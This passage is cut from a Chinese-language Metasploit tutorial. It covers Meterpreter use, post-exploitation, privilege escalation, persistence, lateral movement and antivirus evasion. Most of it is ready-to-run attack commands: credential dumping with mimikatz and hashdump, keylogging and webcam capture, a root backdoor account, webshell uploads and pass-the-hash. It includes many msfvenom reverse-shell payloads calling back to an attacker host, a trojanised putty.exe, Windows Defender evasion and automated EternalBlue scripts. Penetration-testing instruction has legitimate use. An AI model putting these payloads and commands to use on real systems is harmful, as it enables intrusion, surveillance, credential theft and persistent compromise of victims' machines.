meterpreter > creds_all                  # 获取所有凭证
meterpreter > kiwi_cmd sekurlsa::logonpasswords  # 获取明文密码

# 键盘记录
meterpreter > keyscan_start              # 开始键盘记录
meterpreter > keyscan_dump               # 导出记录
meterpreter > keyscan_stop               # 停止记录

# 屏幕截图
meterpreter > screenshot                 # 截图
meterpreter > screenshare                # 实时屏幕共享

# 摄像头
meterpreter > webcam_list                # 列出摄像头
meterpreter > webcam_snap                # 拍照
meterpreter > webcam_stream              # 视频流

# 麦克风
meterpreter > record_mic                 # 录音

# 时间戳修改
meterpreter > timestomp file.txt -m "01/01/2020 00:00:00"  # 修改时间戳
```

### 9.4 Meterpreter 扩展

```bash
# 加载扩展
meterpreter > load <extension>

# 常用扩展
meterpreter > load kiwi                  # Mimikatz（密码获取）
meterpreter > load incognito             # Token 操作
meterpreter > load powershell            # PowerShell
meterpreter > load python                # Python 解释器
meterpreter > load stdapi                # 标准 API（默认加载）
meterpreter > load priv                  # 权限操作
meterpreter > load sniffer               # 网络嗅探
meterpreter > load lanattacks            # 局域网攻击

# Kiwi (Mimikatz) 命令
meterpreter > creds_all                  # 获取所有凭证
meterpreter > creds_kerberos             # Kerberos 票据
meterpreter > creds_msv                  # MSV 凭证
meterpreter > creds_wdigest              # WDigest 凭证
meterpreter > golden_ticket_create       # 创建黄金票据
meterpreter > kerberos_ticket_list       # 列出 Kerberos 票据
meterpreter > kerberos_ticket_purge      # 清除票据
meterpreter > kerberos_ticket_use        # 使用票据
meterpreter > lsa_dump_sam               # 导出 SAM
meterpreter > lsa_dump_secrets           # 导出 LSA 密钥

# Incognito 命令
meterpreter > list_tokens -u             # 列出用户 Token
meterpreter > list_tokens -g             # 列出组 Token
meterpreter > impersonate_token "DOMAIN\\User"  # 模拟 Token
meterpreter > steal_token <pid>          # 窃取进程 Token
meterpreter > drop_token                 # 放弃当前 Token
meterpreter > rev2self                   # 恢复原始 Token

# PowerShell 扩展
meterpreter > powershell_execute "Get-Process"
meterpreter > powershell_import script.ps1
meterpreter > powershell_shell           # 进入 PowerShell
```

### 9.5 进程迁移

进程迁移是将 Meterpreter 会话迁移到另一个进程，用于：
- 提高稳定性（迁移到稳定进程）
- 获取更高权限（迁移到高权限进程）
- 隐藏踪迹（迁移到合法进程）

```bash
# 查看进程列表
meterpreter > ps

# 迁移到指定进程
meterpreter > migrate <pid>

# 自动迁移到稳定进程
meterpreter > run post/windows/manage/migrate

# 常见迁移目标
# explorer.exe    - 用户桌面进程，稳定
# svchost.exe     - 系统服务进程，隐蔽
# lsass.exe       - 本地安全认证，可获取密码
# winlogon.exe    - 登录进程，SYSTEM 权限

# 示例：迁移到 explorer.exe
meterpreter > ps | grep explorer
meterpreter > migrate 1234
```

---

## 10. 后渗透攻击

### 10.1 信息收集

```bash
# 系统信息收集
meterpreter > run post/windows/gather/enum_logged_on_users    # 登录用户
meterpreter > run post/windows/gather/enum_applications       # 安装的应用
meterpreter > run post/windows/gather/enum_services           # 服务列表
meterpreter > run post/windows/gather/enum_shares             # 共享目录
meterpreter > run post/windows/gather/enum_domain             # 域信息
meterpreter > run post/windows/gather/enum_domain_users       # 域用户
meterpreter > run post/windows/gather/enum_domain_group_users # 域组用户
meterpreter > run post/windows/gather/checkvm                 # 检测虚拟机

# 凭证收集
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/smart_hashdump
meterpreter > run post/windows/gather/cachedump
meterpreter > run post/windows/gather/lsa_secrets

# 浏览器信息
meterpreter > run post/windows/gather/enum_chrome
meterpreter > run post/windows/gather/enum_firefox
meterpreter > run post/windows/gather/enum_ie

# 网络信息
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
meterpreter > run post/windows/gather/enum_domain_tokens

# Linux 信息收集
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/enum_network
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/hashdump
meterpreter > run post/linux/gather/enum_users_history
```

### 10.2 凭证获取

```bash
# Windows 密码哈希
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 使用 Kiwi (Mimikatz)
meterpreter > load kiwi
meterpreter > creds_all

# 获取明文密码（需要 SYSTEM 权限）
meterpreter > getsystem
meterpreter > creds_wdigest

# 导出 SAM 数据库
meterpreter > run post/windows/gather/smart_hashdump

# 获取缓存的域凭证
meterpreter > run post/windows/gather/cachedump

# 获取 LSA 密钥
meterpreter > run post/windows/gather/lsa_secrets

# 获取 WiFi 密码
meterpreter > run post/windows/wlan/wlan_profile

# 获取浏览器保存的密码
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome
```

### 10.3 网络侦察

```bash
# ARP 扫描
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24

# 端口扫描
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24

# 路由添加（用于访问内网）
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > run autoroute -p                   # 打印路由

# 或使用 route 命令
msf6 > route add 192.168.2.0/24 <session_id>
msf6 > route print

# 端口转发
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.100
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389

# SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# 配合 proxychains 使用
# 编辑 /etc/proxychains.conf
# socks5 127.0.0.1 1080
# 然后：proxychains nmap -sT 192.168.2.0/24
```

---

## 11. 权限提升

### 11.1 Windows 提权

```bash
# 自动提权尝试
meterpreter > getsystem
meterpreter > getsystem -t 1              # 使用特定技术

# getsystem 技术：
# 0 - 所有技术
# 1 - Named Pipe Impersonation (In Memory/Admin)
# 2 - Named Pipe Impersonation (Dropper/Admin)
# 3 - Token Duplication (In Memory/Admin)
# 4 - Named Pipe Impersonation (RPCSS variant)

# 检查可利用的提权漏洞
meterpreter > run post/multi/recon/local_exploit_suggester

# 常用提权模块
msf6 > use exploit/windows/local/bypassuac
msf6 > use exploit/windows/local/bypassuac_injection
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > use exploit/windows/local/ms14_058_track_popup_menu
msf6 > use exploit/windows/local/always_install_elevated

# 使用提权模块
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 5555
msf6 exploit(...) > exploit

# UAC 绕过
meterpreter > run post/windows/escalate/bypassuac
meterpreter > run post/windows/escalate/bypassuac_injection

# 服务漏洞提权
meterpreter > run post/windows/escalate/service_permissions
```

### 11.2 Linux 提权

```bash
# 检查可利用的提权漏洞
meterpreter > run post/multi/recon/local_exploit_suggester

# 常用 Linux 提权模块
msf6 > use exploit/linux/local/sudo_baron_samedit        # CVE-2021-3156
msf6 > use exploit/linux/local/pkexec                    # CVE-2021-4034
msf6 > use exploit/linux/local/dirty_cow                 # CVE-2016-5195
msf6 > use exploit/linux/local/overlayfs_priv_esc        # CVE-2015-1328

# 使用提权模块
msf6 > use exploit/linux/local/pkexec
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 信息收集辅助提权
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/checkcontainer
meterpreter > run post/linux/gather/enum_protections

# 手动检查
meterpreter > shell
$ uname -a                                # 内核版本
$ cat /etc/issue                          # 系统版本
$ sudo -l                                 # sudo 权限
$ find / -perm -4000 2>/dev/null          # SUID 文件
$ cat /etc/crontab                        # 定时任务
```

### 11.3 提权检查清单

```
┌─────────────────────────────────────────────────────────────────┐
│                    Windows 提权检查清单                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   □ 检查当前权限          getuid / getprivs                     │
│   □ 尝试 getsystem        getsystem                             │
│   □ 检查 UAC 状态         shell > whoami /priv                  │
│   □ 运行漏洞建议器        local_exploit_suggester               │
│   □ 检查服务权限          service_permissions                   │
│   □ 检查计划任务          enum_scheduled_tasks                  │
│   □ 检查 AlwaysInstallElevated                                  │
│   □ 检查未引用服务路径    unquoted_service_path                 │
│   □ 检查 DLL 劫持         dll_hijacking                         │
│   □ 检查 Token            list_tokens                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    Linux 提权检查清单                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   □ 检查内核版本          uname -a                              │
│   □ 检查 sudo 权限        sudo -l                               │
│   □ 检查 SUID 文件        find / -perm -4000                    │
│   □ 检查可写目录          find / -writable                      │
│   □ 检查定时任务          cat /etc/crontab                      │
│   □ 检查敏感文件权限      ls -la /etc/passwd /etc/shadow        │
│   □ 检查运行的服务        ps aux                                │
│   □ 检查网络配置          netstat -tulpn                        │
│   □ 运行漏洞建议器        local_exploit_suggester               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 12. 持久化访问

### 12.1 Windows 持久化

```bash
# 注册表启动项
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50
# -U: 用户登录时启动
# -X: 系统启动时启动
# -i: 连接间隔（秒）
# -p: 监听端口
# -r: 监听主机

# 使用 post 模块
meterpreter > run post/windows/manage/persistence_exe
# 设置参数
set STARTUP SYSTEM                        # 启动类型
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run

# 计划任务持久化
meterpreter > run scheduleme -m 1 -e /tmp/payload.exe
meterpreter > run post/windows/manage/schtasks

# 服务持久化
meterpreter > run metsvc                  # 安装 Meterpreter 服务
meterpreter > run post/windows/manage/persistence_service

# WMI 持久化
msf6 > use exploit/windows/local/wmi_persistence
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 清除持久化
meterpreter > run multi_console_command -c "run persistence -r"
```

### 12.2 Linux 持久化

```bash
# SSH 密钥持久化
meterpreter > run post/linux/manage/sshkey_persistence
# 会在目标 ~/.ssh/authorized_keys 添加公钥

# Cron 持久化
meterpreter > run post/linux/manage/cron_persistence

# 服务持久化
meterpreter > run post/linux/manage/service_persistence

# 手动添加后门用户
meterpreter > shell
$ useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
$ echo "backdoor:password" | chpasswd
```

### 12.3 Web 后门

```bash
# PHP 后门
meterpreter > upload /usr/share/webshells/php/php-backdoor.php /var/www/html/

# ASP 后门
meterpreter > upload /usr/share/webshells/asp/cmd-asp-5.1.asp C:\\inetpub\\wwwroot\\

# JSP 后门
meterpreter > upload /usr/share/webshells/jsp/jsp-reverse.jsp /var/lib/tomcat/webapps/ROOT/
```

---

## 13. 横向移动

### 13.1 Pass-the-Hash

利用获取的 NTLM 哈希进行认证，无需知道明文密码。

```bash
# 使用 psexec 模块
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 使用 wmiexec
msf6 > use exploit/windows/smb/psexec_psh
msf6 exploit(...) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass <hash>
msf6 exploit(...) > exploit

# 使用 smbexec
msf6 > use auxiliary/admin/smb/psexec_command
msf6 auxiliary(...) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > set SMBUser Administrator
msf6 auxiliary(...) > set SMBPass <hash>
msf6 auxiliary(...) > set COMMAND "whoami"
msf6 auxiliary(...) > run
```

### 13.2 Pass-the-Ticket

利用 Kerberos 票据进行认证。

```bash
# 在 Meterpreter 中使用 Kiwi
meterpreter > load kiwi

# 导出票据
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi

# 创建黄金票据
meterpreter > golden_ticket_create -d domain.local -u Administrator -s S-1-5-21-xxx -k <krbtgt_hash> -t /tmp/golden.kirbi

# 使用票据
meterpreter > kerberos_ticket_use /tmp/golden.kirbi
```

### 13.3 内网代理

```bash
# 添加路由
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > run autoroute -p

# 或在 MSF 控制台
msf6 > route add 192.168.2.0/24 1              # 1 是会话 ID
msf6 > route print

# 设置 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# 配置 proxychains
# 编辑 /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# 通过代理扫描内网
$ proxychains nmap -sT -Pn 192.168.2.0/24
$ proxychains curl http://192.168.2.100
```

### 13.4 端口转发

```bash
# 本地端口转发
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.2.100
# 访问本地 8080 端口会转发到 192.168.2.100:80

# 远程端口转发
meterpreter > portfwd add -R -l 3389 -p 3389 -L 192.168.1.50
# 目标机器的 3389 端口转发到攻击者的 3389

# 列出端口转发
meterpreter > portfwd list

# 删除端口转发
meterpreter > portfwd delete -l 8080
meterpreter > portfwd flush                    # 删除所有
```

### 13.5 横向移动模块

```bash
# SMB 相关
msf6 > use exploit/windows/smb/psexec
msf6 > use exploit/windows/smb/psexec_psh
msf6 > use auxiliary/admin/smb/psexec_command

# WMI 相关
msf6 > use exploit/windows/local/wmi
msf6 > use auxiliary/admin/wmi/wmi_exec

# WinRM 相关
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 > use auxiliary/scanner/winrm/winrm_cmd

# SSH 相关
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > use exploit/multi/ssh/sshexec

# RDP 相关
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 > use post/windows/manage/enable_rdp
```

---

## 14. 免杀技术

### 14.1 编码器

```bash
# 查看可用编码器
msf6 > show encoders

# 常用编码器
x86/shikata_ga_nai                        # 最常用，多态编码
x86/jmp_call_additive
x64/xor
x64/zutto_dekiru
cmd/powershell_base64

# 使用编码器
msf6 > use payload/windows/meterpreter/reverse_tcp
msf6 payload(...) > set LHOST 192.168.1.50
msf6 payload(...) > set LPORT 4444
msf6 payload(...) > generate -f exe -e x86/shikata_ga_nai -i 10 -o payload.exe
# -e: 编码器
# -i: 编码次数
# -o: 输出文件

# 多重编码
msf6 payload(...) > generate -f raw -e x86/shikata_ga_nai -i 5 | \
    msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f exe -o payload.exe
```

### 14.2 MSFvenom 免杀

```bash
# 基本生成
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# 使用编码器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# 使用模板（将 payload 注入到合法程序）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -x /path/to/putty.exe -k -f exe -o infected_putty.exe
# -x: 模板文件
# -k: 保持模板功能

# 生成 shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f c -o shellcode.c

# 生成 PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f psh -o payload.ps1

# 生成 Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o payload.py
```

### 14.3 Evasion 模块

```bash
# 查看 Evasion 模块
msf6 > show evasion

# Windows Defender 绕过
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 evasion(...) > set LHOST 192.168.1.50
msf6 evasion(...) > set LPORT 4444
msf6 evasion(...) > run

# Windows Defender JS 绕过
msf6 > use evasion/windows/windows_defender_js_hta
```

### 14.4 高级免杀技术

```bash
# 1. 自定义 shellcode 加载器
# 生成原始 shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shellcode.bin

# 2. 使用 Veil-Evasion（外部工具）
# Veil 可以生成多种免杀 payload

# 3. 使用 Shellter（外部工具）
# 将 shellcode 注入到合法 PE 文件

# 4. 手动混淆
# 修改 Metasploit 模块源码
# 位置：/usr/share/metasploit-framework/modules/

# 5. 使用加密 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    --encrypt xor --encrypt-key mykey -f exe -o encrypted_payload.exe

# 6. 使用 HTTPS payload（加密通信）
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 \
    -f exe -o https_payload.exe
```

### 14.5 免杀检测

```bash
# 本地检测（不上传到在线平台）
# 使用 ClamAV
clamscan payload.exe

# 使用 YARA 规则
yara -r /path/to/rules payload.exe

# 注意：不要将 payload 上传到 VirusTotal 等在线平台
# 这会导致样本被共享给安全厂商
```

---

## 15. MSFvenom 详解

MSFvenom 是 Metasploit 的 payload 生成工具，整合了 msfpayload 和 msfencode。

### 15.1 基本语法

```bash
msfvenom [options] <var=val>

# 常用选项
-p, --payload <payload>       # 指定 payload
-l, --list [type]             # 列出可用项（payloads, encoders, nops, platforms, archs, formats）
-f, --format <format>         # 输出格式
-e, --encoder <encoder>       # 编码器
-i, --iterations <count>      # 编码次数
-o, --out <path>              # 输出文件
-a, --arch <arch>             # 架构（x86, x64）
--platform <platform>         # 平台（windows, linux, osx）
-x, --template <path>         # 模板文件
-k, --keep                    # 保持模板功能
-n, --nopsled <length>        # NOP 滑板长度
-b, --bad-chars <list>        # 坏字符
--encrypt <value>             # 加密方式
--encrypt-key <value>         # 加密密钥
```

### 15.2 常用 Payload 生成

```bash
# ==================== Windows ====================

# Windows 反向 TCP Meterpreter (32位)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o shell.exe

# Windows 反向 TCP Meterpreter (64位)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o shell64.exe

# Windows 反向 HTTPS Meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 \
    -f exe -o shell_https.exe

# Windows 绑定 TCP Shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Windows DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f dll -o shell.dll

# Windows MSI 安装包
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f msi -o shell.msi

# ==================== Linux ====================

# Linux 反向 TCP Meterpreter (32位)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f elf -o shell

# Linux 反向 TCP Meterpreter (64位)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f elf -o shell64

# Linux 反向 Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f elf -o reverse_shell

# ==================== macOS ====================

# macOS 反向 TCP Meterpreter
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f macho -o shell.macho

# ==================== Android ====================

# Android 反向 TCP Meterpreter
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -o shell.apk

# ==================== Web ====================

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.php

# JSP Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.jsp

# WAR 文件
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f war -o shell.war

# ASP Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f asp -o shell.asp

# ASPX Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f aspx -o shell.aspx

# ==================== 脚本 ====================

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shell.pl

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f psh -o shell.ps1

# PowerShell (Base64 编码)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f psh-cmd -o shell_cmd.bat
```

### 15.3 Shellcode 生成

```bash
# C 语言格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f c -o shellcode.c

# Python 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f python -o shellcode.py

# Ruby 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f ruby -o shellcode.rb

# C# 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f csharp -o shellcode.cs

# Hex 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f hex -o shellcode.hex

# Base64 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f base64 -o shellcode.b64

# 原始二进制
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f raw -o shellcode.bin
```

### 15.4 处理坏字符

```bash
# 指定坏字符（常见：\x00\x0a\x0d）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -b '\x00\x0a\x0d' -f exe -o shell.exe

# 常见坏字符
# \x00 - 空字符（字符串终止符）
# \x0a - 换行符 (LF)
# \x0d - 回车符 (CR)
# \x20 - 空格
# \xff - 某些协议的终止符
```

### 15.5 输出格式列表

```bash
# 查看所有输出格式
msfvenom --list formats

# 可执行文件格式
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service,
exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app,
psh, psh-cmd, psh-net, psh-reflection, python-reflection, vba, vba-exe,
vba-psh, vbs, war

# 转换格式
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl,
powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

---

## 16. Armitage 图形界面

Armitage 是 Metasploit 的图形化前端，适合初学者和团队协作。

### 16.1 安装与启动

```bash
# Kali Linux 中安装
sudo apt install armitage

# 启动前确保数据库运行
sudo systemctl start postgresql
sudo msfdb init

# 启动 Armitage
sudo armitage

# 或者使用 teamserver（团队模式）
sudo teamserver <IP> <password>
# 然后其他成员连接到 teamserver
```

### 16.2 界面介绍

```
┌─────────────────────────────────────────────────────────────────┐
│                      Armitage 界面布局                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌─────────────────┐  ┌─────────────────────────────────────┐ │
│   │                 │  │                                     │ │
│   │   模块浏览器    │  │           目标可视化区域            │ │
│   │                 │  │                                     │ │
│   │   - Exploits    │  │     显示扫描发现的主机和服务        │ │
│   │   - Auxiliary   │  │     可以直接右键进行攻击            │ │
│   │   - Post        │  │                                     │ │
│   │   - Payloads    │  │                                     │ │
│   │                 │  │                                     │ │
│   └─────────────────┘  └─────────────────────────────────────┘ │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                                                         │   │
│   │                    控制台/日志区域                       │   │
│   │                                                         │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 16.3 基本操作

```bash
# 1. 添加目标
# Hosts -> Add Hosts -> 输入 IP 地址

# 2. 扫描目标
# Hosts -> Nmap Scan -> Quick Scan (OS detect)

# 3. 查找漏洞
# Attacks -> Find Attacks
# 会自动匹配目标的漏洞利用模块

# 4. 执行攻击
# 右键点击目标 -> Attack -> 选择漏洞利用模块

# 5. 与 Meterpreter 交互
# 右键点击已攻陷的目标 -> Meterpreter -> Interact

# 6. 后渗透
# 右键点击已攻陷的目标 -> Meterpreter -> 选择后渗透模块
```

### 16.4 Hail Mary 自动攻击

```bash
# Hail Mary 是 Armitage 的自动攻击功能
# 会尝试所有可能的漏洞利用

# Attacks -> Hail Mary

# 注意：
# - 会产生大量流量，容易被检测
# - 可能导致目标系统崩溃
# - 仅在授权测试中使用
```

---

## 17. 自动化与脚本

### 17.1 资源脚本（RC 脚本）

```bash
# 创建资源脚本
# 文件：auto_scan.rc

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389
set THREADS 50
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# 执行资源脚本
msfconsole -r auto_scan.rc

# 或在 msfconsole 中执行
msf6 > resource auto_scan.rc
```

### 17.2 自动化漏洞利用脚本

```bash
# 文件：auto_exploit.rc

# 设置全局变量
setg LHOST 192.168.1.50
setg LPORT 4444

# 启动监听器
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit -j

# 执行漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j

# 等待会话
sleep 10

# 后渗透
sessions -c "sysinfo" -i 1
sessions -c "hashdump" -i 1
```

### 17.3 Ruby 脚本

```ruby
# 文件：custom_scanner.rb
# 位置：~/.msf4/modules/auxiliary/scanner/custom/

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Port Scanner',
      'Description'    => 'A custom port scanner module',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run_host(ip)
    begin
      connect
      print_good("#{ip}:#{rport} - Port is open")
      report_service(
        :host => ip,
        :port => rport,
        :proto => 'tcp',
        :state => 'open'
      )
      disconnect
    rescue ::Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
```

### 17.4 Python 自动化（使用 pymetasploit3）

```python
#!/usr/bin/env python3
# pip install pymetasploit3

from pymetasploit3.msfrpc import MsfRpcClient

# 连接到 MSF RPC 服务
# 先启动 RPC：msfrpcd -P password -S
client = MsfRpcClient('password', port=55553, ssl=True)

# 获取控制台
console = client.consoles.console()

# 执行命令
console.write('use exploit/windows/smb/ms17_010_eternalblue')
console.write('set RHOSTS 192.168.1.100')
console.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp')
console.write('set LHOST 192.168.1.50')
console.write('exploit -j')

# 读取输出
import time
time.sleep(5)
print(console.read()['data'])

# 列出会话
sessions = client.sessions.list
for session_id, session_info in sessions.items():
    print(f"Session {session_id}: {session_info['info']}")

# 与会话交互
if sessions:
    session = client.sessions.session('1')
    session.write('sysinfo')
    time.sleep(2)
    print(session.read())
```

### 17.5 自动化后渗透脚本

```bash
# 文件：post_exploit.rc

# 自动化后渗透流程
<ruby>
framework.sessions.each_key do |sid|
  session = framework.sessions[sid]
  
  if session.type == 'meterpreter'
    print_good("Processing session #{sid}")
    
    # 系统信息
    session.sys.config.sysinfo.each do |k, v|
      print_status("#{k}: #{v}")
    end
    
    # 获取用户
    print_status("Current user: #{session.sys.config.getuid}")
    
    # 尝试提权
    begin
      session.priv.getsystem
      print_good("Got SYSTEM!")
    rescue
      print_error("Failed to get SYSTEM")
    end
    
    # 导出哈希
    begin
      session.priv.sam_hashes.each do |hash|
        print_good("Hash: #{hash}")
      end
    rescue
      print_error("Failed to dump hashes")
    end
  end
end
</ruby>
```

---

## 18. 实战案例

### 18.1 案例一：Windows 主机渗透

```bash
# 场景：渗透测试 Windows Server 2008 R2

# 1. 信息收集
msf6 > db_nmap -sS -sV -O 192.168.1.100

# 2. 查看扫描结果
msf6 > hosts
msf6 > services 192.168.1.100

# 3. 发现 SMB 服务，检测 MS17-010
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run
[+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!

# 4. 利用漏洞
